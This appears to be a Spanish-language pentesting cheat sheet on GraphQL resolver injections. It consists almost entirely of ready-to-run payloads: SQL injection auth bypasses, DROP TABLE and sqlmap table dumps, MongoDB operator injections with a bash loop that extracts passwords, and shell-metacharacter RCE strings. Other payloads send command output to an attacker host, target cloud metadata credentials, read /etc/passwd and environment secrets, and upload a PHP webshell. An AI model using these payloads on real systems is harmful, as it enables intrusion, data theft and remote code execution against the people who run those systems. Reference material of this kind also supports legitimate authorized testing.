---
aliases:
  - GraphQL SQLi
  - GraphQL NoSQLi
  - GraphQL SSRF
  - GraphQL Command Injection
tags:
  - type/technique
  - vuln/graphql
  - vuln/sqli
  - vuln/nosqli
  - vuln/ssrf
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[GraphQL Injection]]'
  - '[[SQL Injection (SQLi)]]'
  - '[[NoSQL Injection]]'
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# GraphQL - Inyecciones via Resolvers

***

## SQLi en Args de Query / Mutation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"query{user(username:\"admin' OR 1=1 -- -\"){id email}}"}` | Auth bypass — devuelve primer user | Login resolver con string arg. |
| `{"query":"query{order(id:\"1 UNION SELECT 1,2,3 -- -\"){id}}"}` | UNION extraction | Si `id` declarado como String. |
| `{"query":"query($u:String){user(username:$u){id}}", "variables":{"u":"admin' OR 1=1 -- -"}}` | Auth bypass via variables | Cuando server escapa inline pero no variables. |
| `{"query":"query{users(where:\"role='admin' OR 1=1\"){id}}"}` | Bypass filter | App expone filter raw como string. |
| `{"query":"query{posts(orderBy:\"id);DROP TABLE users--\"){id}}"}` | Order by SQLi | OrderBy interpolado en query. |
| `{"query":"query{users(limit:\"10 UNION SELECT user,pass FROM users--\"){id}}"}` | LIMIT SQLi | Limit declarado como String. |
| `{"query":"mutation{createUser(name:\"x',(SELECT pass FROM users))-- -\"){id}}"}` | INSERT SQLi extraction | Mutation con concat. |
| `{"query":"query($f:JSON){items(filter:$f){id}}", "variables":{"f":{"role":"admin' OR '1'='1"}}}` | Bypass via JSON scalar | Resolver acepta JSON pasa al ORM. |
| `' OR SLEEP(5)-- -` en cualquier String arg | Confirma SQLi blind por timing | No hay error visible. |
| `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a` | Char-by-char extraction blind | Boolean oracle. |
| `sqlmap -r graphql.req --batch --risk 3 --level 5` | Auto-explotar SQLi | Request guardado de Burp con `*` en arg. |
| `sqlmap -r graphql.req --tamper=between,space2comment` | Bypass WAF básico | Filter strip espacios. |
| `sqlmap -r graphql.req --prefix='\"' --suffix='\"' --technique=BEUST` | Forzar quote handling | sqlmap confunde JSON quoting. |
^graphql-inj-sqli

### Workflow sqlmap GraphQL

```bash
# Capturar en Burp con arg controlable
# Save as graphql.req
# Marcar field con * — sqlmap injecta ahí

# Ejemplo req.txt:
# POST /graphql HTTP/1.1
# Host: target
# Content-Type: application/json
# Cookie: session=...
#
# {"query":"query{user(username:\"*\"){id email}}"}

sqlmap -r graphql.req --batch --risk 3 --level 5 --random-agent
sqlmap -r graphql.req --batch --dbs                    # Lista DBs
sqlmap -r graphql.req --batch -D appdb --tables        # Lista tables
sqlmap -r graphql.req --batch -D appdb -T users --dump # Dump users
```

___

## NoSQLi en Resolvers MongoDB

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"query{user(filter:{username:{\"$ne\":null},password:{\"$ne\":null}}){id}}"}` | Auth bypass — primer user con username y password | Mongoose sin sanitización. |
| `{"query":"query{user(filter:{password:{\"$regex\":\"^a.*\"}}){id}}"}` | Confirma char inicial password | Char-by-char extraction. |
| `{"query":"query{user(filter:{$where:\"this.password.length > 10\"}){id}}"}` | Length oracle via $where | $where habilitado en MongoDB. |
| `{"query":"query{user(filter:{$where:\"sleep(5000)\"}){id}}"}` | Timing oracle via $where | Confirma JS eval. |
| `{"variables":{"filter":{"$ne":null}}}` con `query($f:JSON){...}` | Bypass via JSON scalar | Variables JSON passthrough. |
| `{"$in":["admin","root","superuser"]}` | Match cualquiera de la lista | Bulk username probe. |
| `{"$not":{"$eq":"normaluser"}}` | Match todo excepto un value | Logic inversion. |
| `{"$gt":""}` | Match cualquier string | Cuando $ne no funciona. |
| `nosqlmap` con request saved | Auto-explotar NoSQLi | Si pattern es estándar. |
^graphql-inj-nosqli

### Char-by-char password extraction (bash loop)

```bash
PASS=""
for i in {1..32}; do
  for c in {a..z} {0..9}; do
    R=$(curl -s -X POST https://target/graphql \
      -H "Content-Type: application/json" \
      -d "{\"query\":\"query{user(username:\\\"admin\\\",filter:{password:{\\\"\$regex\\\":\\\"^${PASS}${c}\\\"}}){id}}\"}")
    if echo "$R" | grep -q '"id"'; then
      PASS="${PASS}${c}"
      echo "[$i] $PASS"
      break
    fi
  done
done
```

___

## Command Injection / SSRF / Path Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `{"query":"query{ping(host:\"; id; #\"){result}}"}` | RCE via shell metachar | Resolver invoca shell. |
| `{"query":"query{ping(host:\"`id`\"){result}}"}` | RCE via backticks | Shell expansion. |
| `{"query":"query{ping(host:\"127.0.0.1$(id)\"){result}}"}` | RCE via $() | Bash subshell. |
| `{"query":"query{ping(host:\"127.0.0.1\\|id\"){result}}"}` | RCE via pipe | Pipe interpretado. |
| `{"query":"query{ping(host:\";curl http://attacker/$(id\\|base64 -w0)\"){result}}"}` | OOB exfil de output | Blind RCE. |
| `{"query":"query{fetch(url:\"http://127.0.0.1:6379/info\"){data}}"}` | SSRF a Redis local | Mutation con URL field. |
| `{"query":"query{fetch(url:\"http://127.0.0.1:8500/v1/kv/?recurse\"){data}}"}` | SSRF a Consul | Service discovery local. |
| `{"query":"query{fetch(url:\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"){data}}"}` | AWS metadata creds | EC2/EKS host. |
| `{"query":"query{fetch(url:\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"){data}}"}` con header `Metadata: true` | Azure metadata | Azure VM. |
| `{"query":"query{fetch(url:\"http://metadata.google.internal/computeMetadata/v1/\"){data}}"}` con header `Metadata-Flavor: Google` | GCP metadata | GCP VM. |
| `{"query":"query{fetch(url:\"file:///etc/passwd\"){data}}"}` | LFI via file:// | URL parser permite file://. |
| `{"query":"query{fetch(url:\"gopher://127.0.0.1:6379/_INFO\"){data}}"}` | Raw protocol smuggling | Server libcurl con gopher. |
| `{"query":"query{fetch(url:\"http://attacker.oast.fun/$(hostname)\"){data}}"}` | DNS exfil blind SSRF | Sin output visible. |
| `{"query":"mutation{uploadAvatar(url:\"http://attacker.oast.fun/track\"){id}}"}` | Server hace request a tu canary | Confirma SSRF blind. |
| `{"query":"query{readFile(path:\"../../../../etc/passwd\"){content}}"}` | LFI via path traversal | Resolver expone file read. |
| `{"query":"query{readFile(path:\"php://filter/convert.base64-encode/resource=index.php\"){content}}"}` | Source code disclosure | PHP backend. |
| `{"query":"query{readFile(path:\"/proc/self/environ\"){content}}"}` | Env vars + secrets | Linux backend. |
| Multipart upload via spec → ver code block | File upload webshell | Mutation con `Upload!` scalar. |
^graphql-inj-cmdi-ssrf

### Multipart file upload (GraphQL spec)

```bash
# GraphQL multipart spec — webshell upload via mutations
curl -X POST https://target/graphql \
  -F operations='{"query":"mutation($file:Upload!){upload(file:$file){id}}","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@evil.php

# Polyglot PNG/PHP
curl -X POST https://target/graphql \
  -F operations='{"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F map='{"0":["variables.f"]}' \
  -F 0=@shell.png   # PNG header + <?php system($_GET['c']); ?>
```

### Blind SSRF probe con interactsh

```bash
# Generar canary
interactsh-client

# Lanzar con canary URL
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{fetch(url:\"http://abc123.oast.fun/?$(hostname)\"){data}}"}'

# DNS hits → SSRF confirmed + hostname exfil en subdomain
```

***
